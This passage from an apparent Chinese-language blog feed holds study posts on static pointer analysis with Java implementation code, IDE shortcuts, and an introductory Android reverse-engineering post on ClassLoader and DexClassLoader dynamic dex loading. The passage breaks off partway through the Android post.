class="hljs-variable">entry</span> <span class="hljs-operator">=</span> workList.pollEntry();<br>            <span class="hljs-type">Pointer</span> <span class="hljs-variable">ptr</span> <span class="hljs-operator">=</span> entry.pointer();<br>            <span class="hljs-type">PointsToSet</span> <span class="hljs-variable">pts</span> <span class="hljs-operator">=</span> entry.pointsToSet();<br>            <span class="hljs-comment">// 2. get the Δ</span><br>            <span class="hljs-type">PointsToSet</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> propagate(ptr, pts);<br>            <span class="hljs-comment">// 3. if n represents a variable x then</span><br>            <span class="hljs-keyword">if</span> (ptr <span class="hljs-keyword">instanceof</span> VarPtr varPtr) &#123;<br>                <span class="hljs-comment">// 3.1 foreach oi in Δ do</span><br>                <span class="hljs-type">Var</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> varPtr.getVar();<br>                <span class="hljs-keyword">if</span> (delta.isEmpty()) <span class="hljs-keyword">continue</span>;<br>                delta.forEach(obj -&gt; &#123;<br>                    <span class="hljs-comment">// 3.1.1 foreach y = x.f in S do</span><br>                    x.getLoadFields().forEach(loadField -&gt; &#123;<br>                        <span class="hljs-type">JField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> loadField.getFieldRef().resolve();<br>                        <span class="hljs-type">Var</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> loadField.getLValue();<br>                        addPFGEdge(pointerFlowGraph.getInstanceField(obj, f), pointerFlowGraph.getVarPtr(y));<br>                    &#125;);<br>                    <span class="hljs-comment">// 3.1.2 foreach x.f = y in S do</span><br>                    x.getStoreFields().forEach(storeField -&gt; &#123;<br>                        <span class="hljs-type">JField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> storeField.getFieldRef().resolve();<br>                        <span class="hljs-type">Var</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> storeField.getRValue();<br>                        addPFGEdge(pointerFlowGraph.getVarPtr(y), pointerFlowGraph.getInstanceField(obj, f));<br>                    &#125;);<br>                    <span class="hljs-comment">// 3.1.3 foreach y = x[*] in S do</span><br>                    x.getLoadArrays().forEach(loadArray -&gt; &#123;<br>                        <span class="hljs-type">Var</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> loadArray.getLValue();<br>                        addPFGEdge(pointerFlowGraph.getArrayIndex(obj), pointerFlowGraph.getVarPtr(y));<br>                    &#125;);<br>                    <span class="hljs-comment">// 3.1.4 foreach x[*] = y in S do</span><br>                    x.getStoreArrays().forEach(storeArray -&gt; &#123;<br>                        <span class="hljs-type">Var</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> storeArray.getRValue();<br>                        addPFGEdge(pointerFlowGraph.getVarPtr(y), pointerFlowGraph.getArrayIndex(obj));<br>                    &#125;);<br>                    <span class="hljs-comment">// 3.1.5 foreach y = x.m(...) in S do 方法调用</span><br>                    processCall(x, obj);<br>                &#125;);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>​<code>analyze</code>就是上述算法的主体逻辑了，它主要对于影响指针传播的load/store和call操作进行处理。对于语句 <code>ptr instanceof VarPtr varPtr</code> 这个地方的理解就是如果是变量指针才可能继续更新Allocation Site，因为上面的方法 <code>StmtProcessor</code> 有处理静态字段，而后面的 <code>analyze</code> 处理普通字段，前面的不是变量，成为了常量指针，所以这里加以区分。</p><h4 id="propagate"><a class="markdownIt-Anchor" href="#propagate"></a> propagate</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Propagates pointsToSet to pt(pointer) and its PFG successors,</span><br><span class="hljs-comment">     * returns the difference set of pointsToSet and pt(pointer).</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> PointsToSet <span class="hljs-title function_">propagate</span><span class="hljs-params">(Pointer pointer, PointsToSet pointsToSet)</span> &#123;<br>        <span class="hljs-comment">/* TODO - finish me */</span><br>        <span class="hljs-comment">// 1. pts is not empty</span><br>        <span class="hljs-type">PointsToSet</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PointsToSet</span>();<br>        <span class="hljs-keyword">if</span> (pointsToSet.isEmpty()) <span class="hljs-keyword">return</span> delta;<br>        <span class="hljs-comment">// 2. Δ = pts - pt(n) and pt(n) U= pts</span><br>        pointsToSet.forEach(obj -&gt; &#123;<br>            <span class="hljs-keyword">if</span> (pointer.getPointsToSet().addObject(obj))&#123;<br>                delta.addObject(obj);<br>                <span class="hljs-comment">//pointer.getPointsToSet().addObject(obj); // 在if判断时就已经加入边了，这里加上这一句也没有报错，是因为addObject最后是return set.add(obj)，他不会添加重复的元素</span><br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">// 3. foreach m in succ(n) do</span><br>        <span class="hljs-keyword">if</span> (delta.isEmpty()) <span class="hljs-keyword">return</span> delta;<br>        pointerFlowGraph.getSuccsOf(pointer).forEach(suc -&gt; &#123;<br>            workList.addEntry(suc, delta);<br>        &#125;);<br>        <span class="hljs-keyword">return</span> delta;<br>    &#125;<br></code></pre></td></tr></table></figure><p>​这里差集Δ的计算和 <code>propagate</code> 集成在一个方法中。</p><h4 id="processcall"><a class="markdownIt-Anchor" href="#processcall"></a> processCall</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * Processes instance calls when points-to set of the receiver variable changes.</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> var the variable that holds receiver objects</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> recv a new discovered object pointed by the variable.</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processCall</span><span class="hljs-params">(Var <span class="hljs-keyword">var</span>, Obj recv)</span> &#123;<br>       <span class="hljs-comment">// TODO - finish me</span><br>       <span class="hljs-comment">// 1. foreach l: r = x.k(a1,…,an) ∈ S do</span><br>       <span class="hljs-keyword">var</span>.getInvokes().forEach(x -&gt; &#123;<br>           <span class="hljs-comment">// 2. m = Dispatch(o_i, k)</span><br>           <span class="hljs-type">JMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> resolveCallee(recv, x);<br>           <span class="hljs-type">Var</span> <span class="hljs-variable">m_this</span> <span class="hljs-operator">=</span> m.getIR().getThis();<br>           <span class="hljs-comment">// 3. add &lt;m_this, &#123;o_i&#125;&gt; to WL</span><br>           workList.addEntry(pointerFlowGraph.getVarPtr(m_this), <span class="hljs-keyword">new</span> <span class="hljs-title class_">PointsToSet</span>(recv));<br>           <span class="hljs-comment">// process the call</span><br>           processEachCall(x, m);<br>       &#125;);<br>   &#125;<br>   <br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processEachCall</span><span class="hljs-params">(Invoke x, JMethod m)</span>&#123;<br>       <span class="hljs-comment">// 1. if l -&gt; m is not in CG then</span><br>       <span class="hljs-keyword">if</span> (callGraph.addEdge(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Edge</span>&lt;&gt;(CallGraphs.getCallKind(x), x, m)))&#123;<br>           <span class="hljs-comment">// 2. add reachable(m)</span><br>           addReachable(m);<br>           <span class="hljs-comment">// 3. foreach ai = xi ∈ S do</span><br>           <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; x.getInvokeExp().getArgCount(); i ++) &#123;<br>               <span class="hljs-type">Var</span> <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> x.getInvokeExp().getArg(i);<br>               <span class="hljs-type">Var</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> m.getIR().getParam(i);<br>               addPFGEdge(pointerFlowGraph.getVarPtr(arg), pointerFlowGraph.getVarPtr(param));<br>           &#125;<br>           <span class="hljs-comment">// 4. add the edge (m_ret, r) to PFG</span><br>           <span class="hljs-keyword">if</span> (x.getLValue() != <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">// judge the rev is not exist</span><br>               m.getIR().getReturnVars().forEach(m_ret -&gt; &#123;<br>                   addPFGEdge(pointerFlowGraph.getVarPtr(m_ret), pointerFlowGraph.getVarPtr(x.getLValue()));<br>               &#125;);<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里就是对于虚函数调用的处理，同时将 <code>processEachCall</code> 的内容拿出来，以便于初始时对于静态方法的调用处理(因为二者都是方法调用，所以取出共同点封装为一个新方法)。</p>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》_part3</title>
    <link href="/posts/778e2d9.html"/>
    <url>/posts/778e2d9.html</url>
    
    <content type="html"><![CDATA[<p>This is my curriculum understanding.</p><blockquote><p>Reference:</p><p><a href="https://blog.csdn.net/zhang971105/category_10471447.html">静态分析学习笔记</a></p><p><a href="https://ranger-nju.gitbook.io/static-program-analysis-book/">上课笔记</a></p><p><a href="https://static-analysis.cuijiacai.com/05-inter/">详细博客</a></p></blockquote><h1 id="pointer-analysis"><a class="markdownIt-Anchor" href="#pointer-analysis"></a> Pointer Analysis</h1><ul><li>我们将分析一个指针可能指向的 <strong>内存区域(Memory Location)</strong>，以 <strong>程序(Program)</strong> 为输入，以程序中的 <strong>指向关系(Point-to Relation)</strong> 为输出的分析称作 <strong>指针分析(Pointer Analysis)</strong> 。</li><li>指针分析是一种可能性分析，采过近似的方法分析一个指针可能指向的对象的集合。</li></ul><h2 id="key-factor"><a class="markdownIt-Anchor" href="#key-factor"></a> Key Factor</h2><table><thead><tr><th>因素</th><th>问题</th><th>选择</th></tr></thead><tbody><tr><td><strong>堆抽象(Heap Abstraction)</strong></td><td>如何对堆区内存建模？</td><td>分配点(Allocation-site) 无储存(Storeless)</td></tr><tr><td><strong>上下文敏感性(Context Sensitivity)</strong></td><td>如何对调用语境建模？</td><td>上下文敏感(Context-sensitive) 上下文不敏感(Context-insensitive)</td></tr><tr><td><strong>流敏感性(Flow Sensitivity)</strong></td><td>如何对控制流建模？</td><td>流敏感(Flow-sensitive) 流不敏感(Flow-insensitive)</td></tr><tr><td><strong>分析范围(Analysis Scope)</strong></td><td>程序的哪个部分应该被分析？</td><td>全程序(Whole-program) 需求驱动(Demand-driven)</td></tr></tbody></table><ul><li>堆抽象<ul><li>简单而言，就是将动态分配的、无界的具体对象，构建为有限/有界的抽象对象。其中使用最多的就是<code>分配点抽象</code>，也就是将同一分配点处分配内存而产生的对象抽象为一个对象，常见于for循环中一条new语句对于对象的创建。</li></ul></li><li>上下文敏感<ul><li>对于同一个方法调用，如果区分其不同的调用语境，就是上下文敏感，反之就是不敏感。</li><li>简单而言，如果对于某个方法调用，分配内存只构建出一个方法语境，调用该方法的语句都共用这一个语境，那么就是上下文不敏感；反之每次调用都构建一个方法语境，就是上下文敏感。</li></ul></li><li>流敏感<ul><li>流敏感就是尊重语句的执行顺序，它需要在每一个程序点处都维护一个指向关系的映射表。也就是说，每分析一个语句，都是对于上一个语句结果的更新，然后在该语句中存储更新的结果</li><li>对于流不敏感而言，只需要为整个程序维护一个指向关系的映射表。这里首先按照顺序处理，但是并不是对于每一个语句单独处理，而是将新处理的语句加到当前的语句集合中，这样就是对于整个语句进行处理，对于集合的结果进行更新，所以只需要维护一个映射表，也就是集合的结果。而对于算法使用时，可以根据算法的顺序来挑选相应的语句进行处理</li></ul></li><li>分析范围<ul><li>分为全程序分析和特定兴趣点分析，简单而言就是确定分析的内容</li></ul></li></ul><h2 id="非上下文敏感分析"><a class="markdownIt-Anchor" href="#非上下文敏感分析"></a> 非上下文敏感分析</h2><h3 id="rules"><a class="markdownIt-Anchor" href="#rules"></a> Rules</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403290956425.png" alt="image-20240329095618358" /></p><p>​这里实现指针分析的关键就是当 <code>pt(x)</code> 改变时，将改变的部分传递给和 x 相关的其他指针。同时这里也使用一个指针流图来表示对象如何在程序中的指针之间流动。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403310920134.png" alt="image-20240331092026096" /></p><h3 id="过程内指针分析算法"><a class="markdownIt-Anchor" href="#过程内指针分析算法"></a> 过程内指针分析算法</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403292312379.png" alt="image-20240329231214232" /></p><p>​这里首先把所有创建新对象的语句处理一遍，因为它们是所有指向关系的源头和基础；紧接着是处理赋值语句，它将直接在PFG中变量之间添加边；最后是一个基于Worklist的循环，实现指向关系在指针间的传播。</p><h3 id="过程间指针分析算法"><a class="markdownIt-Anchor" href="#过程间指针分析算法"></a> 过程间指针分析算法</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403292350271.png" alt="image-20240329235022008" /></p><h2 id="上下文敏感分析"><a class="markdownIt-Anchor" href="#上下文敏感分析"></a> 上下文敏感分析</h2><p>​上下文敏感(context sensitivity，简称C.S.)分析通过区分不同上下文中的不同数据流来对调用上下文进行建模，从而提升准确性。这里主要是Call-Site Sensitivity，Cloning-Based Context Sensitivity和Context-Sensitive Heap等上下文敏感方法的讲解。</p><h3 id="rules-2"><a class="markdownIt-Anchor" href="#rules-2"></a> Rules</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403310909207.png" alt="image-20240331090934113" /></p><p>​这些规则就是在非上下文敏感的环境下增加了上下文进行处理，其余没有变化。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403310910901.png" alt="image-20240331091014868" /></p><p>​这里调用语句有所区别，因为调用语句除了在原本上下文不敏感的规则之上增加了上下文之外，还有负责被调用者上下文的生成，我们用 <code>Select</code> 函数来表示调用者根据调用点处的信息生成被调用者上下文的过程。Select 根据在调用点 l 处可获得的信息为目标方法 m 选择一个上下文，即目标上下文的生成函数。</p><h3 id="算法"><a class="markdownIt-Anchor" href="#算法"></a> 算法</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403311103157.png" alt="image-20240331110315039" /></p><p>​这里和C.I.的算法进行比较，可以发现只是多了上下文限定和Select函数，其余底层函数AddReachable和ProcessCall则没有变化。</p><h3 id="select函数"><a class="markdownIt-Anchor" href="#select函数"></a> Select函数</h3><p>​主要分为三种方法，Call-Site Sensitivity，Object Sensitivity和Type Sensitivity。</p>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IDEA使用</title>
    <link href="/posts/c044cd4f.html"/>
    <url>/posts/c044cd4f.html</url>
    
    <content type="html"><![CDATA[<h1 id="快捷键使用"><a class="markdownIt-Anchor" href="#快捷键使用"></a> 快捷键使用</h1><ul><li><p><code>ctrl + alt + v / ctrl + enter</code></p><ul><li>自动引入局部变量(introduce local variable)，根据对象自动创建对象类型和对象名</li></ul></li><li><p><code>ctrl + Alt + L</code></p><ul><li>代码格式化</li></ul></li><li><p><code>F5</code></p><ul><li>copy class -&gt; 也可以理解为另存为文件，因为一个class就是一个文件</li></ul></li></ul><p><a href="https://blog.csdn.net/qq_38963960/article/details/89552704">Idea快捷键大全（Windows）-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向入门(5)</title>
    <link href="/posts/ea54ff83.html"/>
    <url>/posts/ea54ff83.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>学习专题</p></blockquote><h1 id="加壳与脱壳"><a class="markdownIt-Anchor" href="#加壳与脱壳"></a> 加壳与脱壳</h1><blockquote><p><a href="https://www.fup1p1.cn/archives/android-ni-xiang-android-ni-xiang-ling-ji-chu-xue-xi">学习链接</a></p></blockquote><h2 id="classloader与动态加载"><a class="markdownIt-Anchor" href="#classloader与动态加载"></a> Classloader与动态加载</h2><p>​这里注意 <code>编写一个动态加载</code>，首先就是 app-debug.apk 的路径在我这里发生了改变，详细看 <code>Android_studio配置</code> 那篇博客。~~然后对于 <code>/sdcard/4.dex</code> 的路径，我这里始终找不到这个文件，后来添加了危险权限的单独授权也不行。之后换成了<code>/storage/emulated/0</code> 路径就可以找到了，这里也不知道为什么，按理来说在大多数 Android 设备上，/sdcard 是 storage/emulated/0 的符号链接，两个目录应该一样才对。感觉应该是 AS 的问题，我在写 /sdcard 的时候给我警告，让我加上了 <code>@SuppressLint(&quot;SdCardPath&quot;)</code>，虽然也没有什么用处。~~下面贴一个代码。这里后来修改后的代码，需要注意对于高版本的sdk，sd卡的读取权限与之前低版本的有所区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.testre;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">import</span> dalvik.system.DexClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-comment">// 定义日志标签为静态常量，方便统一管理</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nuthecz&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        Log.i(TAG, <span class="hljs-string">&quot;start test&quot;</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">appcontext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getApplicationContext();<br>        testdexClassloader(appcontext, <span class="hljs-string">&quot;sdcard/classes3_1.dex&quot;</span>);<span class="hljs-comment">// 这里注意高版本sdk的sd卡读取权限</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testClassloader</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">thisclassloader</span> <span class="hljs-operator">=</span> MainActivity.class.getClassLoader();<br>        Log.i(<span class="hljs-string">&quot;nuthecz&quot;</span>, <span class="hljs-string">&quot;thisclassloader: &quot;</span> + thisclassloader);<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">tmpclassloader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parentclassloader</span> <span class="hljs-operator">=</span> thisclassloader.getParent();<br>        <span class="hljs-keyword">while</span> (parentclassloader != <span class="hljs-literal">null</span>) &#123;<br>            Log.i(<span class="hljs-string">&quot;nuthecz&quot;</span>, <span class="hljs-string">&quot;this:&quot;</span> + thisclassloader + <span class="hljs-string">&quot;- - -&quot;</span> + parentclassloader);<br>            tmpclassloader = parentclassloader.getParent();<br>            thisclassloader = parentclassloader;<br>            parentclassloader = tmpclassloader;<br>        &#125;<br>        Log.i(<span class="hljs-string">&quot;nuthecz&quot;</span>, <span class="hljs-string">&quot;root:&quot;</span> + thisclassloader);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 动态加载dex文件的方法。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context     上下文环境，用于访问应用的特定目录和ClassLoader。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> dexfilepath 需要加载的dex文件的路径。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testLoadDex</span><span class="hljs-params">(Context context, String dexfilepath)</span> &#123;<br>        <span class="hljs-comment">// 创建优化文件目录和库文件目录</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">optFile</span> <span class="hljs-operator">=</span> context.getDir(<span class="hljs-string">&quot;opt_dex&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">libFile</span> <span class="hljs-operator">=</span> context.getDir(<span class="hljs-string">&quot;lib_path&quot;</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">// 获取当前的ClassLoader</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">pathClassLoader</span> <span class="hljs-operator">=</span> MainActivity.class.getClassLoader();<br><br>        <span class="hljs-comment">// 实例化DexClassLoader，用于加载dex文件</span><br>        <span class="hljs-type">DexClassLoader</span> <span class="hljs-variable">dexClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexClassLoader</span>(dexfilepath, optFile.getAbsolutePath(),<br>                libFile.getAbsolutePath(), pathClassLoader);<br><br>        Class&lt;?&gt; loadClass = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 尝试从dex文件中加载指定的类</span><br>            loadClass = dexClassLoader.loadClass(<span class="hljs-string">&quot;com.example.test.Test01&quot;</span>);<br>            Log.i(TAG, <span class="hljs-string">&quot;loadClass success&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            Log.e(TAG, <span class="hljs-string">&quot;Class not found: &quot;</span>, e);<br>            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 类未找到，直接返回</span><br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 获取并反射调用Test01类中的testFunc方法</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">testFuncMethod</span> <span class="hljs-operator">=</span> loadClass.getDeclaredMethod(<span class="hljs-string">&quot;testFunc&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> loadClass.newInstance(); <span class="hljs-comment">// 需要先创建一个Test01的实例</span><br>            testFuncMethod.invoke(obj);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException |<br>                 InstantiationException e) &#123;<br>            Log.e(TAG, <span class="hljs-string">&quot;Failed to invoke testFunc method: &quot;</span>, e);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 测试类加载器的加载顺序。</span><br><span class="hljs-comment">     * 该方法没有参数。</span><br><span class="hljs-comment">     * 该方法没有返回值。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testClassLoadingOrder</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 获取当前MainActivity类的类加载器</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">thisClassLoader</span> <span class="hljs-operator">=</span> MainActivity.class.getClassLoader();<br>            Log.i(TAG, <span class="hljs-string">&quot;thisclassloader: &quot;</span> + thisClassLoader);<br><br>            <span class="hljs-comment">// 获取当前类加载器的父类加载器</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parentClassLoader</span> <span class="hljs-operator">=</span> thisClassLoader.getParent();<br><br>            <span class="hljs-comment">// 遍历类加载器的父级加载器，直到找到根类加载器</span><br>            <span class="hljs-keyword">while</span> (parentClassLoader != <span class="hljs-literal">null</span>) &#123;<br>                Log.i(TAG, <span class="hljs-string">&quot;this:&quot;</span> + thisClassLoader + <span class="hljs-string">&quot;- - -&quot;</span> + parentClassLoader);<br>                <span class="hljs-comment">// 准备下一次循环所需的数据</span><br>                parentClassLoader = parentClassLoader.getParent();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Log.e(TAG, <span class="hljs-string">&quot;Error during class loader traversal.&quot;</span>, e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="加壳app运行流程"><a class="markdownIt-Anchor" href="#加壳app运行流程"></a> 加壳APP运行流程</h2><p>​这里是加壳APP运行流程和ClassLoader修正，之所以要修正，是因为我们一直都是通过 <code>DexClassLoader</code> 来加载类的，它没有生命周期，对于之前我们只有的那个方法而言，它运行不需要什么生命周期，因为它就是一个java的类方法，可以看到运行时只有一个界面。而后来我们更改类继承 <code>AppCompatActivity</code>，那么它就是 android 中的一个activity了，也就是<code>组件类</code>，我们需要给这个组件提供生命周期，所以产生了两种解决方法。同时我们在修改<code>TestClass</code>类的时候运行上面的代码，可以发现报错在 <code>Failed to invoke method</code>，同时查看错误栈，发现报错是<code>NoSuchMethodException</code>，表示这个方法不存在，这也意味着 <code>DexClassLoader</code> 不能识别这种形式的dex文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td 